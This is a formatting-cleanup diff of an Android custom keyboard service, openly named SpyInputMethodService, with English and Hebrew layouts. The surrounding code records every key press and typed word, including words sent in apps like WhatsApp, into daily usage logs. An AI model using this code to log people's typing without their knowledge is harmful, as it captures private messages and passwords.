@@ -56,7 +56,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         return keyboardView;
     }
 
-    private void initKeyboards(){
+    private void initKeyboards() {
         engKeyboard = new Keyboard(this, R.xml.qwerty_eng);
         hebKeyboard = new Keyboard(this, R.xml.qwerty_heb);
         symbolKeyboard = new Keyboard(this, R.xml.symbols_board);
@@ -70,13 +70,13 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
 
     }
 
-    private void initDailyLog(){
+    private void initDailyLog() {
         databaseManager = DatabaseManager.getInstance();
         currentDate = TimeManager.getInstance().getDateOfToday();
         databaseManager.loadDailyLog(currentDate, new OnDailyLogLoaded() {
             @Override
             public void onDailyLogLoaded(DailyUsageLog loadedLog) {
-                if(loadedLog != null)
+                if (loadedLog != null)
                     dailyLog = loadedLog;
                 else
                     dailyLog = new DailyUsageLog();
@@ -92,12 +92,11 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         // Updating the keyboard view based on the current mode
     }
 
-    private void symbolAction(){
+    private void symbolAction() {
         symbol = !symbol;
-        if(symbol) {
+        if (symbol) {
             keyboardView.setKeyboard(symbolKeyboard);
-        }
-        else
+        } else
             keyboardView.setKeyboard(hebrewMode ? hebKeyboard : engKeyboard);
     }
 
@@ -106,8 +105,8 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         if (TextUtils.isEmpty(selectedText)) {
             // no selection, so delete previous character
             ic.deleteSurroundingText(1, 0);
-            if(currentWord.length() > 0){
-                currentWord.deleteCharAt(currentWord.length()-1);
+            if (currentWord.length() > 0) {
+                currentWord.deleteCharAt(currentWord.length() - 1);
             }
         } else {
             // delete the selection
@@ -132,7 +131,6 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
     }
 
 
-
     private void trackKeyPress(String typed) {
         if (sessionUsageLog != null) {
 
@@ -146,8 +144,8 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         }
     }
 
-    private void trackWord(){
-        if(currentWord.length() > 0) {
+    private void trackWord() {
+        if (currentWord.length() > 0) {
             sessionUsageLog.addWord(currentWord.toString());
             currentWord = new StringBuilder(AVG_WORD_LENGTH);
         }
@@ -155,13 +153,16 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
 
     private String codeToString(int primaryCode) {
         char finalCode;
-        if (hebrewMode) {
-            finalCode = dictionary.engToHeb(primaryCode);
-        } else {
-            primaryCode = caps ? primaryCode + ('A' - 'a') : primaryCode; // converting to upper case when shift
-            finalCode = (char) primaryCode; // converting to char
+        if (primaryCode == ' ')
+            finalCode = ' ';
+        else {
+            if (hebrewMode) {
+                finalCode = dictionary.engToHeb(primaryCode);
+            } else {
+                primaryCode = caps ? primaryCode + ('A' - 'a') : primaryCode; // converting to upper case when shift
+                finalCode = (char) primaryCode; // converting to char
+            }
         }
-
 
         return String.valueOf(finalCode);
     }
@@ -184,10 +185,9 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         public void onKey(int primaryCode, int[] keyCodes) {
             InputConnection ic = getCurrentInputConnection();
             if (ic == null) return;
-            if(!isTextBefore()) {
+            if (!isTextBefore()) {
                 trackWord();
             }
-            Log.i("pttt", primaryCode + " CODE ");
             switch (primaryCode) {
                 case Keyboard.KEYCODE_DELETE:
                     deleteAction(ic);
@@ -241,20 +241,20 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
      * It will help us calcualte a new word even though user did not press the spacebar
      * because in messaging apps, like whatsapp, there is a 'send' key which is not a part of the keyboard
      * and there is still a new word there that needs to be tacked.
+     *
      * @return true when there is a text before the cursor
      */
-    private boolean isTextBefore(){
+    private boolean isTextBefore() {
         InputConnection ic = getCurrentInputConnection();
-        return ic.getTextBeforeCursor(1,0).length() != 0;
+        return ic.getTextBeforeCursor(1, 0).length() != 0;
     }
-
 
 
     @Override
     public void onStartInputView(EditorInfo info, boolean restarting) {
         super.onStartInputView(info, restarting);
 
-        if(sessionUsageLog==null)
+        if (sessionUsageLog == null)
             sessionUsageLog = new UsageLog();
 
         if (!currentDate.equals(TimeManager.getInstance().getDateOfToday())) {
@@ -285,7 +285,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         }
     }
 
-    private void endInputSession(){
+    private void endInputSession() {
         if (currentWord != null) {
             trackWord();
         }
